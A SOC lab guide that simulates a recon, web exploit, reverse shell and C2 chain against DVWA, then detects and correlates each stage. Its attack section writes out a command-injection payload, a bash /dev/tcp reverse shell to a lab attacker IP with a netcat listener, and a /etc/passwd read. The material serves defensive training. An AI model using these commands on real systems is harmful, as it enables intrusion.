# Lab 04 - End-to-End SOC Attack Chain Simulation

## Objective

Run a short, complete intrusion in the lab (recon → web exploit → shell → outbound C2) and work it as a SOC analyst: detect each stage, correlate them by attacker IP, and write an incident timeline.

## Lab setup

| Host | Role | Address |
|---|---|---|
| `attacker` | Kali Linux | 192.0.2.10 |
| `lab-target01` | Ubuntu with Apache + DVWA (security = low), Sysmon for Linux | 192.0.2.20 |
| `sensor` | Zeek / Security Onion on the lab segment | 192.0.2.4 |
| `siem` | Splunk or Elastic | 192.0.2.5 |

The chain reuses Labs 02 (scan), 08 (web attack) and 03 (shell). Do those first.

## Attack simulation

> **Authorized use only.** Run these steps only in an isolated lab that you own, against the lab VMs described in [docs/lab-environment.md](../../docs/lab-environment.md). The attack-side commands are standard, publicly documented tool usage for generating telemetry; they are not meant for any other system.

```bash
# Stage 1 - Recon
nmap -sS -sV -p- 192.0.2.20

# Stage 2 - Initial access: DVWA Command Injection page (Security: low), field "ip":
#   127.0.0.1; id
# Stage 3 - Execution: same field, start a reverse shell to the listener
#   127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'
nc -lvnp 4444          # on the attacker, before stage 3

# Stage 4 - C2 / discovery from the shell
id; uname -a; cat /etc/passwd | head -3; exit
```

Write down the wall-clock time of each stage. That record is your ground truth for the timeline.

## Log sources required

| Stage | Source | Key fields |
|---|---|---|
| Recon | Zeek `conn.log` | `id.orig_h`, `conn_state` |
| Exploit | Apache `access.log` (+ ModSecurity audit log for POST bodies) | `clientip`, `uri_query` |
| Execution | Sysmon for Linux 1 | `ParentImage=apache2`, `Image=sh` |
| C2 | Sysmon for Linux 3, Zeek | outbound connection from the shell |

## Detection logic

- **Stage rules:** port scan (Lab 02), web command injection (Lab 08), web server spawns shell (`detections/sigma/web_server_spawns_shell.yml`), and outbound connection from a shell (Lab 03).
- **Chain correlation:** `attack_chain_correlation.spl` tags each event with a stage and alerts when **≥ 3 distinct stages** share one attacker IP within 2 hours. The EQL `sequence` does the host-side half (shell spawn → egress within 10 minutes).
- Note: DVWA's command-injection form uses **POST**, so the payload is not in `access.log`. Use the ModSecurity audit log or the process telemetry for that stage.

### Detection files

| File | Format |
|---|---|
| [`detections/attack_chain.eql`](detections/attack_chain.eql) | Elastic EQL |
| [`detections/attack_chain_correlation.spl`](detections/attack_chain_correlation.spl) | Splunk SPL |
| [`detections/sigma/web_server_spawns_shell.yml`](detections/sigma/web_server_spawns_shell.yml) | Sigma |
| [`detections/web_server_spawns_shell.kql`](detections/web_server_spawns_shell.kql) | KQL (Microsoft Sentinel / Defender) |
| [`detections/sigma-converted/`](detections/sigma-converted/) | Sigma → SPL / Lucene, produced by `scripts/convert-sigma.sh` |

## MITRE ATT&CK mapping

| Tactic | Technique | ID |
|---|---|---|
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046/) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Command and Control | Application Layer Protocol | [T1071](https://attack.mitre.org/techniques/T1071/) |
| Command and Control | Non-Application Layer Protocol | [T1095](https://attack.mitre.org/techniques/T1095/) |

## Tuning notes

- `web_server_spawns_shell` is very high-fidelity on servers that never shell out. If your app legitimately calls `sh` (for example image tools), allowlist by the child's command line, not the parent.
- The chain correlation uses the attacker IP, so NAT or proxies in front of the web server break it. Log `X-Forwarded-For` in that case.
- A lone stage is a lower-severity alert; the chain is the one that pages someone.

## Response steps

**Incident timeline template** (fill in from your run; times in one zone):

| Time | Stage | Evidence (search / event) | ATT&CK | Analyst note |
|---|---|---|---|---|
| _hh:mm:ss_ | Recon | | T1046 | |
| _hh:mm:ss_ | Initial access | | T1190 | |
| _hh:mm:ss_ | Execution | | T1059.004 | |
| _hh:mm:ss_ | C2 | | T1095 | |
| _hh:mm:ss_ | Contained | | | |

1. Contain: isolate the web server (or block the attacker IP), kill the shell.
2. Preserve: copy access logs, the ModSecurity audit log, and process listings before reboot.
3. Eradicate: fix the vulnerable endpoint (input validation; in DVWA, raise the security level), rotate any credentials readable by `www-data`.
4. Report: timeline, root cause, detections that fired or missed, and improvements.

## Results

> **Not filled in yet.** This section is a template. Complete it after running the lab in your own environment. Record only what you actually observed.

| Item | Value |
|---|---|
| Date run | _fill in_ |
| SIEM / version | _fill in_ |
| Attack runs executed | _fill in_ |
| Alerts fired (true positives) | _fill in_ |
| Missed attack runs (false negatives) | _fill in_ |
| False positives before tuning | _fill in_ |
| False positives after tuning | _fill in_ |
| Mean time from attack to alert | _fill in_ |
| Stages detected individually (of 4) | _fill in_ |
| Chain correlation fired? | _fill in_ |

**Evidence:** _add sanitized screenshots or exported results here (documentation IPs only, no real hostnames)._

**What I would change next time:** _fill in_
